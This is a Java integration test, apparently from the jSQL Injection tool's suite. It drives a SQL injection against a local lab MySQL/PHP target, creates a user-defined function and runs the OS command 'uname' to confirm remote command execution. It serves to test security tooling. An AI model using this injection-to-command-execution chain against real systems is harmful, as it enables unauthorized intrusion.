package com.test.vendor.mysql;

import com.jsql.model.InjectionModel;
import com.jsql.model.accessible.ExploitMethod;
import com.jsql.model.exception.JSqlException;
import com.jsql.view.terminal.SystemOutTerminal;
import org.junit.jupiter.api.Assertions;
import org.junitpioneer.jupiter.RetryingTest;

import java.util.UUID;

public class MySqlExploitUdfSuiteIT extends ConcreteMySqlSuiteIT {
    
    @Override
    public void setupInjection() throws Exception {
        InjectionModel model = new InjectionModel();
        this.injectionModel = model;

        model.subscribe(new SystemOutTerminal());

        model.getMediatorUtils().getParameterUtil().initQueryString(
            "http://jsql-lamp:8079/php/get-stack.php?id="
        );

        model.setIsScanning(true);

        model
        .getMediatorUtils()
        .getConnectionUtil()
        .withMethodInjection(model.getMediatorMethod().getQuery())
        .withTypeRequest("GET");

        model
        .getMediatorUtils()
        .getPreferencesUtil()
        .withIsStrategyBlindDisabled(true)
        .withIsStrategyTimeDisabled(true)
        .withIsStrategyStackDisabled(true)
        .withIsStrategyMultibitDisabled(true)
        .withIsStrategyErrorDisabled(true);
        
        model.beginInjection();
    }
    
    @RetryingTest(3)
    public void exploitUdfAuto() throws JSqlException {
        this.injectionModel.getUdfAccess().createUdf(null, ExploitMethod.AUTO);
        String resultCommand = this.injectionModel.getUdfAccess().runCommand(
            "uname",
            UUID.randomUUID()
        );
        LOGGER.info("udf: found {}, to find {}", resultCommand.trim(), "Linux");
        Assertions.assertTrue(resultCommand.trim().contains("Linux"));
    }
}
